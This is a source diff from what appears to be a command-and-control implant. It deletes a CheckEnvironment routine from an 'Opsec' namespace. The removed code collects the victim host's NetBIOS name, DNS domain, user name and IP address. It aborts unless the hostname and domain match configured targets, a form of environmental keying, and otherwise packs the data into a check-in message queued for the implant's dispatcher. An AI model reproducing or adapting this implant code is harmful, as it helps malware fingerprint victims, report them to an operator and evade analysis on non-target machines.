@@ -78,71 +78,7 @@ namespace Opsec {
         return stats.ullAvailPhys > 4;
     }
 
-    BOOL CheckEnvironment() {
-        // TODO: add more information to the checkin message (ETW-TI maybe)
-        HEXANE;
-
-        _stream *out            = CreateStreamWithHeaders(TypeCheckin);
-        IP_ADAPTER_INFO adapter = { };
-
-        unsigned long length    = MAX_PATH;
-        char buffer[MAX_PATH]   = { };
-        bool success            = true;
-
-        if (Ctx->win32.GetComputerNameExA(ComputerNameNetBIOS, (LPSTR) buffer, &length)) {
-            if (Ctx->config.hostname[0]) {
-                if (MbsBoundCompare(buffer, Ctx->config.hostname, MbsLength(Ctx->config.hostname)) != 0) {
-                    return false;
-                }
-            }
-            PackString(out, buffer);
-        }
-        else {
-            PackUint32(out, 0);
-        }
-
-        MemSet(buffer, 0, MAX_PATH);
-        length = MAX_PATH;
-
-        if (Ctx->win32.GetComputerNameExA(ComputerNameDnsDomain, (LPSTR) buffer, &length)) {
-            if (Ctx->transport.domain[0]) {
-                if (MbsBoundCompare(Ctx->transport.domain, buffer, MbsLength(Ctx->transport.domain)) != 0) {
-                    return false;
-                }
-            }
-            PackString(out, buffer);
-        }
-        else {
-            PackUint32(out, 0);
-        }
-
-
-        MemSet(buffer, 0, MAX_PATH);
-        length = MAX_PATH;
-
-        if (Ctx->win32.GetUserNameA((LPSTR) buffer, &length)) {
-            PackString(out, buffer);
-        }
-        else {
-            PackUint32(out, 0);
-        }
-
-        MemSet(buffer, 0, MAX_PATH);
-        length = sizeof(IP_ADAPTER_INFO);
-
-        if (Ctx->win32.GetAdaptersInfo(&adapter, &length) == NO_ERROR) {
-            PackString(out, adapter.IpAddressList.IpAddress.String);
-        }
-        else {
-            PackUint32(out, 0);
-        }
-
-        MemSet(&adapter, 0, sizeof(IP_ADAPTER_INFO));
-
-    defer:
-        Dispatcher::MessageQueue(out);
-        return success;
-    }
+    
 
     BOOL ImageCheckArch(const _executable *const image) {
         HEXANE;
